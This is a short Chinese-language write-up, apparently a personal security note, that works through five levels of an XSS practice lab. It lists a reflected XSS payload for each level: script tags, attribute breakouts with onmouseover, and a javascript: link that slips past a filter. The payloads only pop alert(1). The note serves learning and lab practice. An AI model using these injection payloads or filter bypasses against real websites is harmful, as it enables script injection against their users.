## level1
反射型XSS</br>
```java
payload：?name=<script>alert(1)</script>
```

## level2
```java
payload："><script>alert(1)</script>
```

## level3
输入1<"">''内容然后搜索，查看源代码，两个回显点均过滤特殊字符，但是单引号未过滤。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(1).png height="450" width="850">
```java
payload：1' onmouseover='alert(1)
```
鼠标划过输入框上面即弹窗：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(2).png height="450" width="850">

## level4
跟上一关一样，双引号的不同。</br>
```java
payload：1” onmouseover=“alert(1)
```

## level5
script大小写、on事件被禁用：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(3).png height="450" width="850">
但是双引号、单引号、尖括号都可以用</br>
```java
payload：1"><a href="javascript:alert(1)">
```
















